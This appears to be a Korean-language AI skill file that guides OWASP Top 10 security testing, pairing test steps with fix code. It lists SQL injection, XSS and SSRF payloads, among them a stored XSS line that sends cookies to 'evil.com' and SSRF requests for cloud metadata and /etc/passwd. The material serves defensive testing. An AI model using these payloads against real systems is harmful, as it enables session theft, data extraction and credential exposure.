---
name: owasp-testing-guide
description: "OWASP Top 10 기반 보안 테스트 방법론, 취약점별 공격 벡터, 탐지 방법, 수정 가이드. 'OWASP', 'Top 10', 'XSS', 'SQL Injection', 'CSRF', 'SSRF', 'Injection', '보안 테스트 방법론', '취약점 테스트' 등 웹 애플리케이션 보안 테스트 시 이 스킬을 사용한다. code-analyst와 pentest-reporter의 보안 분석 역량을 강화한다. 단, 실제 침투 테스트 실행이나 네트워크 스캐닝은 이 스킬의 범위가 아니다."
---

# OWASP Testing Guide — OWASP Top 10 보안 테스트 가이드

OWASP Top 10 (2021) 기준 취약점별 탐지/테스트/수정 방법론.

## OWASP Top 10 (2021) 매핑

| 순위 | 카테고리 | CWE 예시 | 심각도 |
|------|---------|---------|--------|
| A01 | Broken Access Control | CWE-200, CWE-352 | Critical |
| A02 | Cryptographic Failures | CWE-259, CWE-327 | High |
| A03 | Injection | CWE-79, CWE-89 | Critical |
| A04 | Insecure Design | CWE-209, CWE-256 | High |
| A05 | Security Misconfiguration | CWE-16, CWE-611 | Medium~High |
| A06 | Vulnerable Components | CWE-1035 | High |
| A07 | Auth Failures | CWE-287, CWE-384 | Critical |
| A08 | Data Integrity Failures | CWE-502 | High |
| A09 | Logging Failures | CWE-778 | Medium |
| A10 | SSRF | CWE-918 | High |

## A01: Broken Access Control

### 테스트 방법
```
1. IDOR (Insecure Direct Object Reference)
   GET /api/users/123/profile → 200 (본인)
   GET /api/users/456/profile → 200 (타인) → 취약!

2. 권한 상승
   일반 사용자 토큰으로 관리자 API 호출:
   POST /api/admin/users (일반 토큰) → 403이어야 함

3. 수평적 권한 이동
   사용자 A 토큰으로 사용자 B 리소스 수정:
   PUT /api/orders/B_ORDER_ID (A 토큰) → 403이어야 함
```

### 수정 가이드
```python
# Before (취약)
@app.get("/api/users/{user_id}")
def get_user(user_id: int):
    return db.query(User).filter(User.id == user_id).first()

# After (수정)
@app.get("/api/users/{user_id}")
def get_user(user_id: int, current_user: User = Depends(get_current_user)):
    if user_id != current_user.id and not current_user.is_admin:
        raise HTTPException(403)
    return db.query(User).filter(User.id == user_id).first()
```

## A03: Injection

### SQL Injection 테스트

```
입력 페이로드:
├── 기본: ' OR '1'='1
├── UNION: ' UNION SELECT username,password FROM users --
├── 시간기반 블라인드: ' AND SLEEP(5) --
├── 에러기반: ' AND 1=CONVERT(int,(SELECT @@version)) --
└── 2차 삽입: admin'--  (회원가입 시 저장, 로그인 시 트리거)
```

### XSS (Cross-Site Scripting) 테스트

```
Reflected XSS:
  /search?q=<script>alert(1)</script>
  /search?q=<img src=x onerror=alert(1)>

Stored XSS:
  댓글/리뷰에 <script>document.location='evil.com?c='+document.cookie</script>

DOM-based XSS:
  #<img src=x onerror=alert(1)> (fragment 기반)
```

### 수정 원칙

| 취약점 | 수정 | 프레임워크 지원 |
|--------|------|---------------|
| SQL Injection | 파라미터화 쿼리 | ORM 사용, raw SQL 금지 |
| XSS | 출력 인코딩 | React JSX 자동 이스케이프, DOMPurify |
| Command Injection | 화이트리스트 검증 | subprocess 시 shell=False |
| LDAP Injection | 파라미터 바인딩 | 라이브러리 내장 이스케이프 |

## A07: Authentication Failures

### 테스트 항목

```
1. 브루트포스 보호
   동일 계정 10회 실패 → 계정 잠금 또는 지수 백오프?

2. 비밀번호 정책
   "password" 허용? 최소 길이? 복잡도?

3. 세션 관리
   로그아웃 후 이전 토큰 유효? (세션 무효화)
   토큰 만료 시간은 적절?

4. JWT 검증
   alg: none 공격 허용?
   시크릿 키 강도?
   토큰 페이로드에 민감 정보?

5. MFA 우회
   MFA 단계 건너뛰기 가능?
   백업 코드 브루트포스 가능?
```

## A10: SSRF (Server-Side Request Forgery)

### 테스트 페이로드
```
내부 네트워크 접근:
  url=http://169.254.169.254/latest/meta-data/  (AWS 메타데이터)
  url=http://localhost:6379/  (내부 Redis)
  url=http://10.0.0.1/admin  (내부 관리 콘솔)

프로토콜 변형:
  url=file:///etc/passwd
  url=gopher://127.0.0.1:25/
  url=dict://127.0.0.1:6379/info
```

### 수정
```python
# SSRF 방지: URL 화이트리스트 + 내부 IP 차단
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        return False
    ip = socket.gethostbyname(parsed.hostname)
    for blocked in BLOCKED_RANGES:
        if ipaddress.ip_address(ip) in blocked:
            return False
    return True
```

## 보안 헤더 체크리스트

| 헤더 | 권장값 | 목적 |
|------|-------|------|
| Content-Security-Policy | script-src 'self' | XSS 방지 |
| X-Content-Type-Options | nosniff | MIME 스니핑 방지 |
| X-Frame-Options | DENY | 클릭재킹 방지 |
| Strict-Transport-Security | max-age=31536000; includeSubDomains | HTTPS 강제 |
| X-XSS-Protection | 0 (CSP 사용 시) | 레거시 XSS 필터 |
| Referrer-Policy | strict-origin-when-cross-origin | 리퍼러 누출 방지 |

## CVSS 심각도 등급

| 등급 | 점수 | 대응 기한 |
|------|------|----------|
| Critical | 9.0~10.0 | 24시간 내 |
| High | 7.0~8.9 | 1주 내 |
| Medium | 4.0~6.9 | 1개월 내 |
| Low | 0.1~3.9 | 다음 릴리스 |
